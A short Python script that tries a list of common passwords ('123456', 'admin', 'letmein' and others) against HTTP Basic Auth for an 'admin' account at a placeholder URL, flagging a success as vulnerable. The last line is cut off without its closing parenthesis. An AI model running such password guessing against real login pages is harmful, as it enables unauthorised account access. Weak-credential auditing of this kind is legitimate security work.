import requests
from requests.auth import HTTPBasicAuth

# ANSI color codes
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def brute_force_login(url, username, password_list):
    for password in password_list:
        response = requests.get(url, auth=HTTPBasicAuth(username, password))
        if response.status_code == 200:
            print(f"{RED}[VULNERABLE]{RESET} Login successful! Username: {username}, Password: {password}")
            return
        else:
            print(f"{YELLOW}[FAILED]{RESET} Tried {password}")

passwords = ["123456", "password", "admin", "letmein", "1234"]
brute_force_login("http://example.com/login", "admin", passwords
